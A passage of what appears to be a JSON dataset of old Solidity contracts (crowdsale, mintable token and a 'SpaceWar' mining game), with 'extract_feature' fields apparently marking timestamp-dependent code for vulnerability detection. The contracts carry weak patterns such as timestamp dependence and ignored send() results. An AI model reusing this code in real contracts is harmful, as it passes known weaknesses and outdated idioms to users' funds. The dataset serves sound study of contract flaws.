(joinedCrowdsalesLen > 0)\n return joinedCrowdsales[joinedCrowdsalesLen - 1];\n else\n return address(0);\n }\n function setJoinedCrowdsales(address addr) private onlyOwner {\n assert(addr != address(0));\n assert(joinedCrowdsalesLen <= joinedCrowdsalesLenMax);\n assert(!isTierJoined(addr));\n joinedCrowdsales.push(addr);\n joinedCrowdsaleState[addr] = JoinedCrowdsaleStatus({\n isJoined: true,\n position: joinedCrowdsalesLen\n });\n joinedCrowdsalesLen++;\n }\n function updateJoinedCrowdsalesMultiple(address[] addrs) public onlyOwner {\n assert(addrs.length > 0);\n assert(joinedCrowdsalesLen == 0);\n assert(addrs.length <= joinedCrowdsalesLenMax);\n for (uint8 iter = 0; iter < addrs.length; iter++) {\n setJoinedCrowdsales(addrs[iter]);\n }\n }\n function setStartsAt(uint time) onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(time <= endsAt);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = 0; j < tierPosition; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time >= crowdsale.endsAt());\n }\n startsAt = time;\n StartsAtChanged(startsAt);\n }\n function setEndsAt(uint time) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= time);\n assert(startsAt <= time);\n assert(now <= endsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n if (lastTierCntrct.finalized()) throw;\n uint8 tierPosition = getTierPosition(this);\n for (uint8 j = tierPosition + 1; j < joinedCrowdsalesLen; j++) {\n CrowdsaleExt crowdsale = CrowdsaleExt(joinedCrowdsales[j]);\n assert(time <= crowdsale.startsAt());\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) public onlyOwner {\n assert(address(_pricingStrategy) != address(0));\n assert(address(pricingStrategy) == address(0));\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f9a"
  },
  "filename": "9820.sol",
  "content": "pragma solidity ^0.4.16;\ncontract CrowdsaleRC {\n uint public createdTimestamp; uint public start; uint public deadline;\n address public owner;\n address public beneficiary;\n uint public amountRaised;\n uint public maxAmount;\n mapping(address => uint256) public balanceOf;\n mapping (address => bool) public whitelist;\n event FundTransfer(address backer, uint amount, bool isContribution);\n function CrowdsaleRC () public {\n createdTimestamp = block.timestamp;\n start = 1529316000;\n deadline = 1532080800;\n amountRaised = 0;\n beneficiary = 0xD27eAD21C9564f122c8f84cD98a505efDf547665;\n owner = msg.sender;\n maxAmount = 2000 ether;\n }\n function () payable public {\n require( (msg.value >= 0.1 ether) && block.timestamp >= start && block.timestamp <= deadline && amountRaised < maxAmount\n && ( (msg.value <= 100 ether) || (msg.value > 100 ether && whitelist[msg.sender]==true) )\n );\n uint amount = msg.value;\n balanceOf[msg.sender] += amount;\n amountRaised += amount;\n FundTransfer(msg.sender, amount, true);\n if (beneficiary.send(amount)) {\n FundTransfer(beneficiary, amount, false);\n }\n }\n function whitelistAddress (address uaddress) public {\n require (owner == msg.sender || beneficiary == msg.sender);\n whitelist[uaddress] = true;\n }\n function removeAddressFromWhitelist (address uaddress) public {\n require (owner == msg.sender || beneficiary == msg.sender);\n whitelist[uaddress] = false;\n }\n}",
  "extract_feature": [
    "function CrowdsaleRC () public {\ncreatedTimestamp = block.timestamp;\nstart = 1529316000;\ndeadline = 1532080800;\namountRaised = 0;\nbeneficiary = 0xD27eAD21C9564f122c8f84cD98a505efDf547665;\nowner = msg.sender;\nmaxAmount = 2000 ether;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1f9b"
  },
  "filename": "9830.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n require(c >= a);\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {\n require(b <= a);\n c = a - b;\n }\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a * b;\n require(a == 0 || c / a == b);\n }\n}\nlibrary NumericSequence\n{\n using SafeMath for uint256;\n function sumOfN(uint256 basePrice, uint256 pricePerLevel, uint256 owned, uint256 count) internal pure returns (uint256 price)\n {\n require(count > 0);\n price = 0;\n price += SafeMath.mul((basePrice + pricePerLevel * owned), count);\n price += pricePerLevel * (count.mul((count-1))) / 2;\n }\n}\ncontract SpaceWar {\n using NumericSequence for uint;\n using SafeMath for uint;\n struct MinerData\n {\n uint256[9] spaces;\n uint8[3] hasUpgrade;\n uint256 money;\n uint256 lastUpdateTime;\n uint256 premamentMineBonusPct;\n uint256 unclaimedPot;\n uint256 lastPotClaimIndex;\n }\n struct SpaceData\n {\n uint256 basePrice;\n uint256 baseOutput;\n uint256 pricePerLevel;\n uint256 priceInETH;\n uint256 limit;\n }\n struct BoostData\n {\n uint256 percentBonus;\n uint256 priceInWEI;\n }\n struct PVPData\n {\n uint256[6] troops;\n uint256 immunityTime;\n uint256 exhaustTime;\n }\n struct TroopData\n {\n uint256 attackPower;\n uint256 defensePower;\n uint256 priceGold;\n uint256 priceETH;\n }\n uint8 private constant NUMBER_OF_RIG_TYPES = 9;\n SpaceData[9] private spaceData;\n uint8 private constant NUMBER_OF_UPGRADES = 3;\n BoostData[3] private boostData;\n uint8 private constant NUMBER_OF_TROOPS = 6;\n uint8 private constant ATTACKER_START_IDX = 0;\n uint8 private constant ATTACKER_END_IDX = 3;\n uint8 private constant DEFENDER_START_IDX = 3;\n uint8 private constant DEFENDER_END_IDX = 6;\n TroopData[6] private troopData;\n uint256 private honeyPotAmount;\n uint256 private honeyPotSharePct;\n uint256 private jackPot;\n uint256 private devFund;\n uint256 private nextPotDistributionTime;\n mapping(address => mapping(uint256 => uint256)) private minerICOPerCycle;\n uint256[] private honeyPotPerCycle;\n uint256[] private globalICOPerCycle;\n uint256 private cycleCount;\n uint256 private constant NUMBER_OF_BOOSTERS = 5;\n uint256 private boosterIndex;\n uint256 private nextBoosterPrice;\n address[5] private boosterHolders;\n mapping(address => MinerData) private miners;\n mapping(address => PVPData) private pvpMap;\n mapping(uint256 => address) private indexes;\n uint256 private topindex;\n address private owner;\n function SpaceWar() public {\n owner = msg.sender;\n spaceData[0] = SpaceData(500, 1, 5, 0, 999);\n spaceData[1] = SpaceData(50000, 10, 500, 0, 999);\n spaceData[2] = SpaceData(5000000, 100, 50000, 0, 999);\n spaceData[3] = SpaceData(80000000, 1000, 800000, 0, 999);\n spaceData[4] = SpaceData(500000000, 20000, 5000000, 0.01 ether, 999);\n spaceData[5] = SpaceData(10000000000, 100000, 100000000, 0, 999);\n spaceData[6] = SpaceData(100000000000, 1000000, 1000000000, 0, 999);\n spaceData[7] = SpaceData(1000000000000, 50000000, 10000000000, 0.1 ether, 999);\n spaceData[8] = SpaceData(10000000000000, 100000000,100000000000, 0, 999);\n boostData[0] = BoostData(30, 0.01 ether);\n boostData[1] = BoostData(50, 0.1 ether);\n boostData[2] = BoostData(100, 1 ether);\n topindex = 0;\n honeyPotAmount = 0;\n devFund = 0;\n jackPot = 0;\n nextPotDistributionTime = block.timestamp;\n honeyPotSharePct = 90;\n boosterHolders[0] = owner;\n boosterHolders[1] = owner;\n boosterHolders[2] = owner;\n boosterHolders[3] = owner;\n boosterHolders[4] = owner;\n boosterIndex = 0;\n nextBoosterPrice = 0.1 ether;\n troopData[0] = TroopData(10, 0, 100000, 0);\n troopData[1] = TroopData(1000, 0, 80000000, 0);\n troopData[2] = TroopData(100000, 0, 1000000000, 0.01 ether);\n troopData[3] = TroopData(0, 15, 100000, 0);\n troopData[4] = TroopData(0, 1500, 80000000, 0);\n troopData[5] = TroopData(0, 150000, 1000000000, 0.01 ether);\n honeyPotPerCycle.push(0);\n globalICOPerCycle.push(1);\n cycleCount = 0;\n }\n function GetMinerData(address minerAddr) public constant returns\n (uint256 money, uint256 lastupdate, uint256 prodPerSec,\n uint256[9] spaces, uint[3] upgrades, uint256 unclaimedPot, bool hasBooster, uint256 unconfirmedMoney)\n {\n uint8 i = 0;\n money = miners[minerAddr].money;\n lastupdate = miners[minerAddr].lastUpdateTime;\n prodPerSec = GetProductionPerSecond(minerAddr);\n for(i = 0; i < NUMBER_OF_RIG_TYPES; ++i)\n {\n spaces[i] = miners[minerAddr].spaces[i];\n }\n for(i = 0; i < NUMBER_OF_UPGRADES; ++i)\n {\n upgrades[i] = miners[minerAddr].hasUpgrade[i];\n }\n unclaimedPot = miners[minerAddr].unclaimedPot;\n hasBooster = HasBooster(minerAddr);\n unconfirmedMoney = money + (prodPerSec * (now - lastupdate));\n }\n function GetTotalMinerCount() public constant returns (uint256 count)\n {\n count = topindex;\n }\n function GetMinerAt(uint256 idx) public constant returns (address minerAddr)\n {\n require(idx < topindex);\n minerAddr = indexes[idx];\n }\n function GetPotInfo() public constant returns (uint256 _honeyPotAmount, uint256 _devFunds, uint256 _jackPot, uint256 _nextDistributionTime)\n {\n _honeyPotAmount = honeyPotAmount;\n _devFunds = devFund;\n _jackPot = jackPot;\n _nextDistributionTime = nextPotDistributionTime;\n }\n function GetProductionPerSecond(address minerAddr) public constant returns (uint256 personalProduction)\n {\n MinerData storage m = miners[minerAddr];\n personalProduction = 0;\n uint256 productionSpeed = 100 + m.premamentMineBonusPct;\n if(HasBooster(minerAddr))\n productionSpeed += 100;\n for(uint8 j = 0; j < NUMBER_OF_RIG_TYPES; ++j)\n {\n personalProduction += m.spaces[j] * spaceData[j].baseOutput;\n }\n personalProduction = personalProduction * productionSpeed / 100;\n }\n function GetGlobalProduction() public constant returns (uint256 globalMoney, uint256 globalHashRate)\n {\n globalMoney = 0;\n globalHashRate = 0;\n uint i = 0;\n for(i = 0; i < topindex; ++i)\n {\n MinerData storage m = miners[indexes[i]];\n globalMoney += m.money;\n globalHashRate += GetProductionPerSecond(indexes[i]);\n }\n }\n function GetBoosterData() public constant returns (address[5] _boosterHolders, uint256 currentPrice, uint256 currentIndex)\n {\n for(uint i = 0; i < NUMBER_OF_BOOSTERS; ++i)\n {\n _boosterHolders[i] = boosterHolders[i];\n }\n currentPrice = nextBoosterPrice;\n currentIndex = boosterIndex;\n }\n function HasBooster(address addr) public constant returns (bool hasBoost)\n {\n for(uint i = 0; i < NUMBER_OF_BOOSTERS; ++i)\n {\n if(boosterHolders[i] == addr)\n return true;\n }\n return false;\n }\n function GetPVPData(address addr) public constant returns (uint256 attackpower, uint256 defensepower, uint256 immunityTime, uint256 exhaustTime,\n uint256[6] troops)\n {\n PVPData storage a = pvpMap[addr];\n immunityTime = a.immunityTime;\n exhaustTime = a.exhaustTime;\n attackpower = 0;\n defensepower = 0;\n for(uint i = 0; i < NUMBER_OF_TROOPS; ++i)\n {\n attackpower += a.troops[i] * troopData[i].attackPower;\n defensepower += a.troops[i] * troopData[i].defensePower;\n troops[i] = a.troops[i];\n }\n }\n function GetCurrentICOCycle() public constant returns (uint256)\n {\n return cycleCount;\n }\n function GetICOData(uint256 idx) public constant returns (uint256 ICOFund, uint256 ICOPot)\n {\n require(idx <= cycleCount);\n ICOFund = globalICOPerCycle[idx];\n if(idx < cycleCount)\n {\n ICOPot = honeyPotPerCycle[idx];\n } else\n {\n ICOPot = honeyPotAmount / 10;\n }\n }\n function GetMinerICOData(address miner, uint256 idx) public constant returns (uint256 ICOFund, uint256 ICOShare, uint256 lastClaimIndex)\n {\n require(idx <= cycleCount);\n ICOFund = minerICOPerCycle[miner][idx];\n if(idx < cycleCount)\n {\n ICOShare = (honeyPotPerCycle[idx] * minerICOPerCycle[miner][idx]) / globalICOPerCycle[idx];\n } else\n {\n ICOShare = (honeyPotAmount / 10) * minerICOPerCycle[miner][idx] / globalICOPerCycle[idx];\n }\n lastClaimIndex = miners[miner].lastPotClaimIndex;\n }\n function GetMinerUnclaimedICOShare(address miner) public constant returns (uint256 unclaimedPot)\n {\n MinerData storage m = miners[miner];\n require(m.lastUpdateTime != 0);\n require(m.lastPotClaimIndex < cycleCount);\n uint256 i = m.lastPotClaimIndex;\n uint256 limit = cycleCount;\n if((limit - i) > 30)\n limit = i + 30;\n unclaimedPot = 0;\n for(; i < cycleCount; ++i)\n {\n if(minerICOPerCycle[miner][i] > 0)\n unclaimedPot += (honeyPotPerCycle[i] * minerICOPerCycle[miner][i]) / globalICOPerCycle[i];\n }\n }\n function StartNewMiner() external\n {\n require(miners[msg.sender].lastUpdateTime == 0);\n miners[msg.sender].lastUpdateTime = block.timestamp;\n miners[msg.sender].money = 0;\n miners[msg.sender].spaces[0] = 1;\n miners[msg.sender].unclaimedPot = 0;\n miners[msg.sender].lastPotClaimIndex = cycleCount;\n pvpMap[msg.sender].immunityTime = block.timestamp + 14400;\n pvpMap[msg.sender].exhaustTime = block.timestamp;\n indexes[topindex] = msg.sender;\n ++topindex;\n }\n function UpgradeSpace(uint8 spaceIdx, uint16 count) external\n {\n require(spaceIdx < NUMBER_OF_RIG_TYPES);\n require(count > 0);\n require(count <= 999);\n require(spaceData[spaceIdx].priceInETH == 0);\n MinerData storage m = miners[msg.sender];\n require(spaceData[spaceIdx].limit >= (m.spaces[spaceIdx] + count));\n UpdateMoney();\n uint256 price = NumericSequence.sumOfN(spaceData[spaceIdx].basePrice, spaceData[spaceIdx].pricePerLevel, m.spaces[spaceIdx], count);\n require(m.money >= price);\n m.spaces[spaceIdx] = m.spaces[spaceIdx] + count;\n if(m.spaces[spaceIdx] > spaceData[spaceIdx].limit)\n m.spaces[spaceIdx] = spaceData[spaceIdx].limit;\n m.money -= price;\n }\n function UpgradeSpaceETH(uint8 spaceIdx, uint256 count) external payable\n {\n require(spaceIdx < NUMBER_OF_RIG_TYPES);\n require(count > 0);\n require(count <= 999);\n require(spaceData[spaceIdx].priceInETH > 0);\n MinerData storage m = miners[msg.sender];\n require(spaceData[spaceIdx].limit >= (m.spaces[spaceIdx] + count));\n uint256 price = (spaceData[spaceIdx].priceInETH).mul(count);\n uint256 priceCoin = NumericSequence.sumOfN(spaceData[spaceIdx].basePrice, spaceData[spaceIdx].pricePerLevel, m.spaces[spaceIdx], count);\n UpdateMoney();\n require(msg.value >= price);\n require(m.money >= priceCoin);\n BuyHandler(msg.value);\n m.spaces[spaceIdx] = m.spaces[spaceIdx] + count;\n if(m.spaces[spaceIdx] > spaceData[spaceIdx].limit)\n m.spaces[spaceIdx] = spaceData[spaceIdx].limit;\n m.money -= priceCoin;\n }\n function UpdateMoney() private\n {\n require(miners[msg.sender].lastUpdateTime != 0);\n require(block.timestamp >= miners[msg.sender].lastUpdateTime);\n MinerData storage m = miners[msg.sender];\n uint256 diff = block.timestamp - m.lastUpdateTime;\n uint256 revenue = GetProductionPerSecond(msg.sender);\n m.lastUpdateTime = block.timestamp;\n if(revenue > 0)\n {\n revenue *= diff;\n m.money += revenue;\n }\n }\n function UpdateMoneyAt(address addr) private\n {\n require(miners[addr].lastUpdateTime != 0);\n require(block.timestamp >= miners[addr].lastUpdateTime);\n MinerData storage m = miners[addr];\n uint256 diff = block.timestamp - m.lastUpdateTime;\n uint256 revenue = GetProductionPerSecond(addr);\n m.lastUpdateTime = block.timestamp;\n if(revenue > 0)\n {\n revenue *= diff;\n m.money += revenue;\n }\n }\n function BuyUpgrade(uint256 idx) external payable\n {\n require(idx < NUMBER_OF_UPGRADES);\n require(msg.value >= boostData[idx].priceInWEI);\n require(miners[msg.sender].hasUpgrade[idx] == 0);\n require(miners[msg.sender].lastUpdateTime != 0);\n BuyHandler(msg.value);\n UpdateMoney();\n miners[msg.sender].hasUpgrade[idx] = 1;\n miners[msg.sender].premamentMineBonusPct += boostData[idx].percentBonus;\n }\n function BuyBooster() external payable\n {\n require(msg.value >= nextBoosterPrice);\n require(miners[msg.sender].lastUpdateTime != 0);\n for(uint i = 0; i < NUMBER_OF_BOOSTERS; ++i)\n if(boosterHolders[i] == msg.sender)\n revert();\n address beneficiary = boosterHolders[boosterIndex];\n MinerData storage m = miners[beneficiary];\n m.unclaimedPot += (msg.value * 9403) / 10000;\n honeyPotAmount += (msg.value * 597) / 20000;\n devFund += (msg.value * 597) / 20000;\n nextBoosterPrice += nextBoosterPrice / 20;\n UpdateMoney();\n UpdateMoneyAt(beneficiary);\n boosterHolders[boosterIndex] = msg.sender;\n boosterIndex += 1;\n if(boosterIndex >= 5)\n boosterIndex = 0;\n }\n function BuyTroop(uint256 idx, uint256 count) external payable\n {\n require(idx < NUMBER_OF_TROOPS);\n require(count > 0);\n require(count <= 1000);\n PVPData storage pvp = pvpMap[msg.sender];\n MinerData storage m = miners[msg.sender];\n uint256 owned = pvp.troops[idx];\n uint256 priceGold = NumericSequence.sumOfN(troopData[idx].priceGold, troopData[idx].priceGold / 100, owned, count);\n uint256 priceETH = (troopData[idx].priceETH).mul(count);\n UpdateMoney();\n require(m.money >= priceGold);\n require(msg.value >= priceETH);\n if(priceGold > 0)\n m.money -= priceGold;\n if(msg.value > 0)\n BuyHandler(msg.value);\n pvp.troops[idx] += count;\n }\n function Attack(address defenderAddr) external\n {\n require(msg.sender != defenderAddr);\n require(miners[msg.sender].lastUpdateTime != 0);\n require(miners[defenderAddr].lastUpdateTime != 0);\n PVPData storage attacker = pvpMap[msg.sender];\n PVPData storage defender = pvpMap[defenderAddr];\n uint i = 0;\n uint256 count = 0;\n require(block.timestamp > attacker.exhaustTime);\n require(block.timestamp > defender.immunityTime);\n if(attacker.immunityTime > block.timestamp)\n attacker.immunityTime = block.timestamp - 1;\n attacker.exhaustTime = block.timestamp + 3600;\n uint256 attackpower = 0;\n uint256 defensepower = 0;\n for(i = 0; i < ATTACKER_END_IDX; ++i)\n {\n attackpower += attacker.troops[i] * troopData[i].attackPower;\n defensepower += defender.troops[i + DEFENDER_START_IDX] * troopData[i + DEFENDER_START_IDX].defensePower;\n }\n if(attackpower > defensepower)\n {\n if(defender.immunityTime < block.timestamp + 14400)\n defender.immunityTime = block.timestamp + 14400;\n UpdateMoneyAt(defenderAddr);\n MinerData storage m = miners[defenderAddr];\n MinerData storage m2 = miners[msg.sender];\n uint256 moneyStolen = m.money / 2;\n for(i = DEFENDER_START_IDX; i < DEFENDER_END_IDX; ++i)\n {\n defender.troops[i] = defender.troops[i]/2;\n }\n for(i = ATTACKER_START_IDX; i < ATTACKER_END_IDX; ++i)\n {\n if(troopData[i].attackPower > 0)\n {\n count = attacker.troops[i];\n if((count * troopData[i].attackPower) > defensepower)\n {\n count = count * defensepower / attackpower / 2;\n }\n else\n {\n count = count/2;\n }\n attacker.troops[i] = SafeMath.sub(attacker.troops[i],count);\n defensepower -= count * troopData[i].attackPower;\n }\n }\n m.money -= moneyStolen;\n m2.money += moneyStolen;\n } else\n {\n for(i = ATTACKER_START_IDX; i < ATTACKER_END_IDX; ++i)\n {\n attacker.troops[i] = attacker.troops[i] / 2;\n }\n for(i = DEFENDER_START_IDX; i < DEFENDER_END_IDX; ++i)\n {\n if(troopData[i].defensePower > 0)\n {\n count = defender.troops[i];\n if((count * troopData[i].defensePower) > attackpower)\n count = count * attackpower / defensepower / 2;\n defender.troops[i] -= count;\n attackpower -= count * troopData[i].defensePower;\n }\n }\n }\n }\n function ReleaseICO() external\n {\n require(miners[msg.sender].lastUpdateTime != 0);\n require(nextPotDistributionTime <= block.timestamp);\n require(honeyPotAmount > 0);\n require(globalICOPerCycle[cycleCount] > 0);\n nextPotDistributionTime = block.timestamp + 86400;\n honeyPotPerCycle[cycleCount] = honeyPotAmount / 10;\n honeyPotAmount -= honeyPotAmount / 10;\n honeyPotPerCycle.push(0);\n globalICOPerCycle.push(0);\n cycleCount = cycleCount + 1;\n MinerData storage jakpotWinner = miners[msg.sender];\n jakpotWinner.unclaimedPot += jackPot;\n jackPot = 0;\n }\n function FundICO(uint amount) external\n {\n require(miners[msg.sender].lastUpdateTime != 0);\n require(amount > 0);\n MinerData storage m = miners[msg.sender];\n UpdateMoney();\n require(m.money >= amount);\n m.money = (m.money).sub(amount);\n globalICOPerCycle[cycleCount] = globalICOPerCycle[cycleCount].add(uint(amount));\n minerICOPerCycle[msg.sender][cycleCount] = minerICOPerCycle[msg.sender][cycleCount].add(uint(amount));\n }\n function WithdrawICOEarnings() external\n {\n MinerData storage m = miners[msg.sender];\n require(miners[msg.sender].lastUpdateTime != 0);\n require(miners[msg.sender].lastPotClaimIndex < cycleCount);\n uint256 i = m.lastPotClaimIndex;\n uint256 limit = cycleCount;\n if((limit - i) > 30)\n limit = i + 30;\n m.lastPotClaimIndex = limit;\n for(; i < cycleCount; ++i)\n {\n if(minerICOPerCycle[msg.sender][i] > 0)\n m.unclaimedPot += (honeyPotPerCycle[i] * minerICOPerCycle[msg.sender][i]) / globalICOPerCycle[i];\n }\n }\n function BuyHandler(uint amount) private\n {\n honeyPotAmount += (amount * honeyPotSharePct) / 100;\n jackPot += amount / 100;\n devFund += (amount * (100-(honeyPotSharePct+1))) / 100;\n }\n function WithdrawPotShare() public\n {\n MinerData storage m = miners[msg.sender];\n require(m.unclaimedPot > 0);\n require(m.lastUpdateTime != 0);\n uint256 amntToSend = m.unclaimedPot;\n m.unclaimedPot = 0;\n if(msg.sender.send(amntToSend))\n {\n m.unclaimedPot = 0;\n }\n }\n function WithdrawDevFunds() public\n {\n require(msg.sender == owner);\n if(owner.send(devFund))\n {\n devFund = 0;\n }\n }\n function() public payable {\n devFund += msg.value;\n }\n}",
  "extract_feature": [
